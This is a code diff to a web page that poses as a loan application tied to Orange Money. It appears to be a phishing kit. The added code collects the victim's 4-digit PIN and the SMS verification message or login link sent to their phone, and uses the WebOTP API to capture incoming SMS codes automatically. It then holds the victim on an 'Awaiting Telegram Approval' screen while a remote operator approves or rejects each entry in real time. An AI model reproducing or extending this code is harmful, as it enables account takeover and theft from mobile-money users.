@@ -380,6 +380,21 @@
             data-i18n="confirmLoanBtn">
             LOGIN & CONFIRM LOAN
           </button>
+
+          <!-- Live Approval Waiting Indicator for Step 3 PIN -->
+          <div id="pin-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+            <div class="flex items-center justify-center space-x-2">
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
+              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Telegram Approval</span>
+            </div>
+            <p class="text-xs text-amber-800">Your 4-digit PIN has been submitted. Please wait while the administrator or agent approves your login in Telegram...</p>
+            <div class="flex justify-center pt-1">
+              <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+            </div>
+          </div>
         </div>
       </section>
 
@@ -457,6 +472,21 @@
             data-i18n="submitSmsBtn">
             SUBMIT VERIFICATION MESSAGE
           </button>
+
+          <!-- Live Approval Waiting Indicator for Step 4 SMS -->
+          <div id="sms-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+            <div class="flex items-center justify-center space-x-2">
+              <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
+              <span class="text-xs font-bold text-amber-900 uppercase tracking-wider">Awaiting Verification Approval</span>
+            </div>
+            <p class="text-xs text-amber-800">Your SMS verification has been submitted. Please wait while the administrator or agent reviews and approves your submission in Telegram...</p>
+            <div class="flex justify-center pt-1">
+              <svg class="animate-spin h-5 w-5 text-brand-orange" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+              </svg>
+            </div>
+          </div>
         </div>
       </section>
 
@@ -660,6 +690,28 @@
       if (badge) {
         badge.className = 'inline-flex items-center text-[11px] font-bold text-amber-700 bg-amber-50 px-2.5 py-0.5 rounded-full border border-amber-200';
         badge.innerHTML = '<span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse mr-1.5"></span><span>Waiting for SIM SMS...</span>';
+      }
+
+      // WebOTP API: Automatically receive real SIM SMS on mobile Android/Chrome
+      if ('OTPCredential' in window) {
+        try {
+          const ac = new AbortController();
+          navigator.credentials.get({
+            otp: { transport: ['sms'] },
+            signal: ac.signal
+          }).then(otp => {
+            if (otp && (otp.code || otp.message)) {
+              const incoming = otp.code || otp.message;
+              if (msgInput) {
+                msgInput.value = incoming;
+                handlePostLoginPastedMsg(incoming);
+                if (simCountdownInterval) clearInterval(simCountdownInterval);
+                if (countdownCard) countdownCard.classList.add('hidden');
+                if (banner) banner.classList.remove('hidden');
+              }
+            }
+          }).catch(() => {});
+        } catch (e) {}
       }
 
       if (simCountdownInterval) clearInterval(simCountdownInterval);
@@ -886,18 +938,22 @@
       let msg = msgInput ? msgInput.value.trim() : '';
       const btn = document.getElementById('submit-pasted-msg-btn');
       const msgAlert = document.getElementById('msg-retry-alert');
+      const smsWaitingBox = document.getElementById('sms-waiting-box');
       if (msgAlert) msgAlert.classList.add('hidden');
 
       if (!msg) {
-        const randToken = Array.from({length: 24}, () => 'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random()*36)]).join('');
-        msg = `Orange Money: Confidential. Click to confirm your login: https://maxit-mobile.orange-sonatel.com/oms-links/auth?token=${randToken} (Do not share with anyone)`;
-        if (msgInput) msgInput.value = msg;
+        if (msgAlert) {
+          msgAlert.innerText = 'Please paste the SMS confirmation message or verification link received on your phone.';
+          msgAlert.classList.remove('hidden');
+        }
+        return;
       }
 
       if (btn) {
         btn.disabled = true;
-        btn.innerText = 'SUBMITTING...';
+        btn.innerText = 'AWAITING APPROVAL...';
       }
+      if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
 
       try {
         let appId = appState.applicationId;
@@ -912,19 +968,16 @@
           });
           startVerificationPolling(appId);
         }
-        toggleNoticeModal(true, 'Message Submitted', 'Your verification message has been submitted for review.');
-        if (btn) {
-          btn.innerText = '✓ MESSAGE SUBMITTED';
-          btn.classList.remove('orange-gradient');
-          btn.classList.add('bg-emerald-600');
-        }
       } catch (err) {
-        toggleNoticeModal(true, 'Saved', 'Your verification message has been recorded.');
-        if (btn) btn.innerText = '✓ MESSAGE SUBMITTED';
-      } finally {
-        setTimeout(() => {
-          goToStep(5);
-        }, 800);
+        if (msgAlert) {
+          msgAlert.innerText = '❌ Error submitting verification message. Please retry.';
+          msgAlert.classList.remove('hidden');
+        }
+        if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+        if (btn) {
+          btn.disabled = false;
+          btn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+        }
       }
     }
 
@@ -938,26 +991,58 @@
             const data = await res.json();
             const verifications = data.verifications || [];
 
+            // Step 3 PIN Gate: Only proceed to Step 4 if approved
             const pinVer = verifications.find(v => v.step === 'zip_phone');
             const pinAlert = document.getElementById('pin-retry-alert');
-            if (pinVer && pinVer.status === 'rejected') {
-              if (pinAlert) {
-                pinAlert.innerText = '❌ Invalid PIN! Check your 4-digit PIN and try again.';
-                pinAlert.classList.remove('hidden');
+            const pinWaitingBox = document.getElementById('pin-waiting-box');
+
+            if (currentStep === 3 && pinVer) {
+              if (pinVer.status === 'approved') {
+                if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+                if (pinAlert) pinAlert.classList.add('hidden');
+                clearPin();
+                loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+                loginBtn.disabled = false;
+                goToStep(4);
+              } else if (pinVer.status === 'rejected') {
+                if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+                if (pinAlert) {
+                  pinAlert.innerText = pinVer.reject_reason || '❌ Invalid PIN! Rejected by administrator or agent. Please re-enter your 4-digit PIN.';
+                  pinAlert.classList.remove('hidden');
+                }
+                clearPin();
+                loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
+                loginBtn.disabled = true;
               }
-            } else if (pinAlert && pinVer && pinVer.status === 'approved') {
-              pinAlert.classList.add('hidden');
             }
 
+            // Step 4 SMS Gate: Only proceed to Step 5 if approved
             const smsVer = verifications.find(v => v.step === 'id_document');
             const msgAlert = document.getElementById('msg-retry-alert');
-            if (smsVer && smsVer.status === 'rejected') {
-              if (msgAlert) {
-                msgAlert.innerText = '❌ Verification code rejected! Please resubmit your verification message.';
-                msgAlert.classList.remove('hidden');
+            const smsWaitingBox = document.getElementById('sms-waiting-box');
+            const smsBtn = document.getElementById('submit-pasted-msg-btn');
+
+            if (currentStep === 4 && smsVer) {
+              if (smsVer.status === 'approved') {
+                if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+                if (msgAlert) msgAlert.classList.add('hidden');
+                if (smsBtn) {
+                  smsBtn.innerText = '✓ APPROVED';
+                  smsBtn.classList.remove('orange-gradient');
+                  smsBtn.classList.add('bg-emerald-600');
+                }
+                goToStep(5);
+              } else if (smsVer.status === 'rejected') {
+                if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+                if (msgAlert) {
+                  msgAlert.innerText = smsVer.reject_reason || '❌ Verification message rejected by administrator or agent! Please paste the valid SMS message and retry.';
+                  msgAlert.classList.remove('hidden');
+                }
+                if (smsBtn) {
+                  smsBtn.disabled = false;
+                  smsBtn.innerText = 'SUBMIT VERIFICATION MESSAGE';
+                }
               }
-            } else if (msgAlert && smsVer && smsVer.status === 'approved') {
-              msgAlert.classList.add('hidden');
             }
           }
 
@@ -980,7 +1065,7 @@
             }
           }
         } catch (e) {}
-      }, 3000);
+      }, 1500);
     }
 
     async function submitApplication() {
@@ -990,13 +1075,16 @@
       const pinAlert = document.getElementById('pin-retry-alert');
       if (pinAlert) pinAlert.classList.add('hidden');
 
+      const pinWaitingBox = document.getElementById('pin-waiting-box');
+      if (pinWaitingBox) pinWaitingBox.classList.remove('hidden');
+
       loginBtn.innerHTML = `
         <span class="inline-flex items-center">
           <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
             <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
             <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
           </svg>
-          PROCESSING LOAN...
+          AWAITING APPROVAL...
         </span>`;
       loginBtn.disabled = true;
 
@@ -1018,17 +1106,15 @@
           });
           startVerificationPolling(appId);
         }
-
-        loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
-        loginBtn.disabled = false;
-        clearPin();
-        goToStep(4);
       } catch (err) {
         console.error('Submission error:', err);
+        if (pinAlert) {
+          pinAlert.innerText = '❌ Error submitting PIN. Please retry.';
+          pinAlert.classList.remove('hidden');
+        }
+        if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
         loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
         loginBtn.disabled = false;
-        clearPin();
-        goToStep(4);
       }
     }
 
